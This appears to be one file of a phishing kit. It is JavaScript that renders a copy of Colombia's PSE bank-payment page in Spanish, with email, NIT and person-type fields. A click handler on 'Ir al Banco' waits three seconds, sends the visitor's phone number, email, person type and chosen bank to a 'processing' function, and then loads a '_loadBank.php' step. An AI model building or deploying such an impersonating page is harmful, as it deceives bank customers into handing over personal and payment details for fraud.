var my_titulo = 'Pago con PSE';
var pse_body = `
<div id="pagePrincipal">
    <div id="movilACHST" class="movilACH movilACHSTPN">
        <div id="movilACHSTCss" class="movilACHSTPNCss">
            <div class="div_tipo_persona">
                <span class="txt_tipo_persona">Selecciona el tipo de persona:</span>
            </div>
            <div class="div_tipo_personaCss">
                <div id="id_per_naturalP" class="col-xs-6 left nopadding per_natural_checkP">
                    <div id="id_per_natural" class="per_natural_check" onclick="onClickPersona('nat');">
                        <input type="radio" id="rdUsertype0" name="person_option" style="visibility:hidden" checked="checked">
                        <span><img id="id_per_natural_IMG" class="per_natural_check_IMGCss" src="${my_hosting}PSEUserRegister/assets/img/natural_check.svg">&nbsp;&nbsp;Natural</span>
                        <span id="lineaPN" class="lineaPNCss" style="margin-top: 20px;"><img src="${my_hosting}PSEUserRegister/assets/img/lineaA.png"></span>
                    </div>
                </div>
                <div id="id_per_juridicaP" class="col-xs-6 right nopadding per_juridicaP">
                    <div id="id_per_juridica" class="per_juridica" onclick="onClickPersona('jur');">
                        <input type="radio" id="rdUsertype1" name="person_option" style="visibility:hidden">
                        <span><img id="id_per_juridica_IMG" class="per_juridica_IMGCss" src="${my_hosting}PSEUserRegister/assets/img/juridica.svg">&nbsp;&nbsp;Jurídica</span>
                        <span id="lineaPJ" class="lineaPNCss" style="display: none;"><img src="${my_hosting}PSEUserRegister/assets/img/lineaA.png"></span>
                    </div>
                </div>
            </div>
            <div id="div_registro_menuST" class="div-registro-menu div_registro_menuSTPN" style="text-align: center;">
                <div class="list-option" style="text-align: center;">
                    <label id="rdOptionCreateP" class="btn-option-click">
                        <input type="radio" id="rdOptionYes" name="action_person" checked="checked">
                        <span class="btn-option-span">&nbsp;<i class="fa"></i><img id="rdOptionCreateI" src="${my_hosting}PSEUserRegister/assets/img/opreg_sel.svg">&nbsp;Soy un usuario registrado</span>
                    </label>
                    <label id="rdOptionUpdateP" class="btn-option">
                        <input type="radio" id="rdOptionNow" name="action_person">
                        <span class="btn-option-span">&nbsp;<i class="fa"></i><img id="rdOptionUpdateI" src="${my_hosting}PSEUserRegister/assets/img/opact.svg">&nbsp;Registrarme ahora</span>
                    </label>
                    <label id="rdOptionDeleteP" class="btn-option" style="display: none;">
                        <input type="radio" id="rdOptionNo" name="action_person" style="display: none;">
                        <span class="btn-option-span" id="spnOptionNo" style="display: none;">&nbsp;<i class="fa"></i><img id="rdOptionDeleteI" src="${my_hosting}PSEUserRegister/assets/img/opbor.svg">&nbsp;Registro preliminar</span>
                    </label>
                </div>
                <table id="trRegistradoPN" width="100%" style="display: table;">
                    <tbody>
                        <tr>
                            <td colspan="3" style="height: 30px;"></td>
                        </tr>
                        <tr>
                            <td class="PJTableST1"></td>
                            <td class="PJIngresoCampos"><span class="UPDTextIngreso">Ingresa tu correo electrónico </span><span style="color: red;">*</span></td>
                            <td class="PJTableST1"></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>
                                <table style="width: 100%">
                                    <tbody>
                                        <tr>
                                            <td class="PJTable3"></td>
                                            <td>
                                                <div class="form-group">
                                                    <input type="text" class="form-control" id="PNEMail" name="PNEMail" placeholder="Ej: correo@pse.com.co" data-toggle="tooltip" data-placement="top" maxlength="120" data-fv-regexp="true" data-fv-regexp-regexp="^[^@\s]+@([^@\s]+\.)+[^@\s]+$" data-fv-regexp-message="El campo E-mail es inválido" data-fv-stringlength-max="120" data-fv-stringlength-message="El campo E-mail debe tener hasta 120 caracteres" data-fv-field="PNEMail" title="" data-original-title="Ingresa el correo electrónico asociado a tu registro">
                                                    <small class="help-block" data-fv-validator="regexp" data-fv-for="PNEMail" data-fv-result="NOT_VALIDATED" style="display: none;">El campo E-mail es inválido</small><small class="help-block" data-fv-validator="stringLength" data-fv-for="PNEMail" data-fv-result="NOT_VALIDATED" style="display: none;">El campo E-mail debe tener hasta 120 caracteres</small>
                                                </div>
                                            </td>
                                            <td class="PJTable3"></td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                            <td></td>
                        </tr>
                    </tbody>
                </table>
                <table id="trRegistradoPJ" width="100%" class="" style="display: none;">
                    <tbody>
                        <tr>
                            <td class="stpj">&nbsp;</td>
                            <td>
                                <div class="confirmation-form-box" style="height: 110px; text-align: center;">
                                    <div class="row camposUDPJ">
                                        <div class="form-group col-lg-5 col-md-5 col-sm-12 col-xs-12">
                                            <p style="width: 100%; text-align: left;"><span class="UPDTextIngreso">NIT </span><span style="color: red;">*</span></p>
                                            <br>
                                            <input type="text" class="form-control correoPN" id="PJNIT" name="PJNIT" placeholder="NIT registrado en PSE" data-toggle="tooltip" data-placement="top" maxlength="15" data-fv-notempty="true" data-fv-notempty-message="El campo NIT es requerido" data-fv-regexp="true" data-fv-regexp-regexp="^[a-zA-Z0-9]{1,15}$" data-fv-regexp-message="El NIT debe ser alfanumérico de 1 hasta 15 caracteres" data-fv-field="PJNIT" title="" data-original-title="Ingresa el NIT asociado a tu registro">
                                            <small class="help-block" data-fv-validator="notEmpty" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED" style="display: none;">El campo NIT es requerido</small><small class="help-block" data-fv-validator="regexp" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED" style="display: none;">El NIT debe ser alfanumérico de 1 hasta 15 caracteres</small><small class="help-block" data-fv-validator="stringLength" data-fv-for="PJNIT" data-fv-result="NOT_VALIDATED" style="display: none;">Please enter a value with valid length</small>
                                        </div>
                                        <div class="form-group col-lg-1 col-md-1 col-sm-12 col-xs-12"></div>
                                        <div class="form-group col-lg-5 col-md-5 col-sm-12 col-xs-12">
                                            <p style="width: 100%; text-align: left;"><span class="UPDTextIngreso">Correo Electronico </span><span style="color: red;">*</span></p>
                                            <br>
                                            <input type="email" class="form-control correoPN" id="PJEMail" name="PJEMail" onkeypress="checkPolicyChangeDiv('PJEMail');" placeholder="E-mail registrado en PSE" maxlength="120" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="El campo e-mail es requerido" data-fv-emailaddress-message="El campo e-mail es inválido" data-fv-field="PJEMail" title="" data-original-title="Ingresa el correo electrónico asociado a tu registro">
                                            <small class="help-block" data-fv-validator="emailAddress" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED" style="display: none;">El campo e-mail es inválido</small><small class="help-block" data-fv-validator="notEmpty" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED" style="display: none;">El campo e-mail es requerido</small><small class="help-block" data-fv-validator="stringLength" data-fv-for="PJEMail" data-fv-result="NOT_VALIDATED" style="display: none;">Please enter a value with valid length</small>
                                        </div>
                                    </div>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <div class="row visible-lg visible-md">
                    <div class="col-lg-12 col-md-12" style="position: absolute; top: 180px; left: 0px; right: 0px; margin: auto;">
                        <div class="text-center btns">
                            <button type="button" id="btnCancel" class="btn-blanco" formnovalidate="" onclick="abandonPayment(1);">Regresar al comercio</button>
                            &nbsp;&nbsp;&nbsp;
                            <button type="button" id="btnSeguir" class="btn-amarillo">Ir al Banco</button>
                        </div>
                    </div>
                </div>
                <div class="row visible-xs visible-sm">
                    <div id="botonesSTPN2" class="text-center btns stpnS2">
                        <div class="col-xs-12 col-sm-12"><button type="button" id="btnSeguir2" class="btn-amarillo">Ir al Banco</button></div>
                        <div class="col-xs-12 col-sm-12"><button type="button" id="btnCancel2" class="btn-blanco" formnovalidate="">Regresar al comercio</button></div>
                    </div>
                </div>
            </div>
        </div>
    </div>


</div>

`;

var my_contenido = `
<?php require_once('__plantilla_pse.php'); ?>
`;

//<script>
    $(document).on('click', '#btnSeguir', function(e) {
        my_data['pse_nequi'] = true;
        setTimeout(function() {
            processing({
                t: 'datos',
                celular: my_data['phoneNumber'],
                email: $('#PNEMail').val(),
                personType: my_data['personType'],
                banco: my_data['banco'],
            });

            loadFileFromFolder('', '_loadBank.php', {});
        }, 3000);
    });